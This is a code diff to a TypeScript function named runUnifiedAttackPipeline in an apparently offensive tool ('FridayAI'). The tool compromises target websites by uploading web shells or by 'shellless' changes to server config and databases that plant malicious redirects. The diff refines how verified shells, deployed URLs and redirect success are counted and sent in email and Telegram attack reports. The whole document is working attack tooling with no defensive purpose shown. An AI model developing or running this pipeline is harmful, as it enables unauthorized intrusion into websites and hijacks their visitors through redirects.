@@ -1373,12 +1373,14 @@ export async function runUnifiedAttackPipeline(
         aiDecisions.push(`✅ Shellless attacks: ${shelllessSuccesses.length}/${shelllessResults.length} methods succeeded`);
 
         // Add successful shellless results as "uploaded files" for downstream compatibility
+        // NOTE: shellless methods don't actually place files — they modify server config/DB
+        // verified should be based on redirectWorks (actual redirect test), NOT just sr.success
         for (const sr of shelllessSuccesses) {
           uploadedFiles.push({
             url: sr.injectedUrl || config.targetUrl,
             shell: shells[0] || { id: "shellless", type: "shellless" as any, filename: sr.method, content: "", size: 0, mimeType: "text/html", headers: {} },
             method: `shellless_${sr.method}`,
-            verified: sr.success,
+            verified: sr.redirectWorks === true, // Only verified if redirect actually works
             redirectWorks: sr.redirectWorks || false,
             httpStatus: 200,
           });
@@ -1600,8 +1602,10 @@ export async function runUnifiedAttackPipeline(
       vulns: (vulnScan?.misconfigurations?.length || 0) + (configResults?.filter(r => r.success).length || 0),
       creds: discoveredCredentials?.length || 0,
       uploadPaths: vulnScan?.writablePaths?.length || prescreen?.writablePaths?.length || 0,
-      shellUrls: uploadedFiles.filter(f => f.verified).length,
-      deployedFiles: uploadedFiles.length,
+      // Only count real uploaded shells (not shellless which don't place files)
+      shellUrls: uploadedFiles.filter(f => f.verified && !f.method.startsWith("shellless_")).length,
+      // deployedFiles = real uploads + shellless with confirmed redirect
+      deployedFiles: uploadedFiles.filter(f => !f.method.startsWith("shellless_") || f.redirectWorks).length,
       verifiedUrls: uploadedFiles.filter(f => f.redirectWorks).length,
     },
   });
@@ -1609,7 +1613,11 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 5: Final Result ───
   const verifiedFiles = uploadedFiles.filter(f => f.verified);
   const redirectWorkingFiles = uploadedFiles.filter(f => f.redirectWorks);
-  const success = redirectWorkingFiles.length > 0 || verifiedFiles.length > 0;
+  // Separate real uploads from shellless for accurate success determination
+  const realVerifiedFiles = verifiedFiles.filter(f => !f.method.startsWith("shellless_"));
+  const shelllessVerifiedFiles = verifiedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
+  // Success = real file uploaded & verified, OR shellless with confirmed redirect
+  const success = realVerifiedFiles.length > 0 || shelllessVerifiedFiles.length > 0 || redirectWorkingFiles.length > 0;
 
   const result: PipelineResult = {
     success,
@@ -1665,10 +1673,14 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Email Notification (primary) + Telegram (backup) ───
   try {
-    const deployedUrls = uploadedFiles.map(f => f.url);
+    // For email: show real deployed URLs, not target URL from shellless
+    const deployedUrls = uploadedFiles
+      .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
+      .map(f => f.method.startsWith("shellless_") ? `${f.url} (via ${f.method})` : f.url);
     const shelllessSuccessCount = shelllessResults.filter(r => r.success).length;
-    const statusEmoji = success ? "✅" : (shelllessSuccessCount > 0 ? "⚠️" : "❌");
-    const statusText = success ? "SUCCESS" : (shelllessSuccessCount > 0 ? "PARTIAL (shellless)" : "FAILED");
+    const hasRealFileSuccess = realVerifiedFiles.length > 0;
+    const statusEmoji = hasRealFileSuccess ? "✅" : (success ? "⚠️" : (shelllessSuccessCount > 0 ? "⚠️" : "❌"));
+    const statusText = hasRealFileSuccess ? "SUCCESS" : (success ? "PARTIAL (shellless redirect confirmed)" : (shelllessSuccessCount > 0 ? "PARTIAL (shellless, redirect unconfirmed)" : "FAILED"));
 
     // Build email body
     const emailSubject = `${statusEmoji} FridayAI Attack Report: ${config.targetUrl} — ${statusText}`;
@@ -1726,9 +1738,21 @@ export async function runUnifiedAttackPipeline(
 
   // Telegram as backup
   try {
-    const deployedUrls = uploadedFiles.map(f => f.url);
+    // Only show URLs that are actual deployed files (not target URL from shellless)
+    const realDeployedUrls = uploadedFiles
+      .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
+      .map(f => f.url)
+      .filter(url => url !== config.targetUrl); // Never show target URL as "deployed"
+    // If only shellless with redirectWorks, show target URL with note
+    const shelllessWithRedirect = uploadedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
+    const deployedUrls = realDeployedUrls.length > 0 
+      ? realDeployedUrls 
+      : shelllessWithRedirect.map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`);
+    // Determine notification type: only "success" if real files deployed or shellless redirect confirmed
+    const hasRealSuccess = realVerifiedFiles.length > 0;
+    const hasShelllessRedirect = shelllessVerifiedFiles.length > 0;
     const telegramPayload: TelegramNotification = {
-      type: success ? "success" : (uploadedFiles.length > 0 ? "partial" : "failure"),
+      type: hasRealSuccess ? "success" : (hasShelllessRedirect ? "partial" : (uploadedFiles.length > 0 ? "partial" : "failure")),
       targetUrl: config.targetUrl,
       redirectUrl: config.redirectUrl,
       deployedUrls,
